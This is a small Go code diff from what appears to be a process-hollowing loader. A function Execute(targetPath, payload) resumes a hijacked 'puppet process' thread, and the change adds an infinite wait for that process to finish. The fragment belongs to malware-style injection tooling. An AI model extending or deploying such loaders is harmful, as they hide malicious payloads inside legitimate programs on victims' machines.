@@ -140,5 +140,8 @@ func Execute(targetPath string, payload []byte) error {
 	procSetThreadContext.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(alignCtx)))
 	procResumeThread.Call(uintptr(pi.Thread))
 
+	// 🌟 12. 阻塞等待：等待傀儡进程（真实程序）运行结束。0xFFFFFFFF 代表 INFINITE（无限等待）
+	procWaitForSingleObject.Call(uintptr(pi.Process), 0xFFFFFFFF)
+
 	return nil
 }
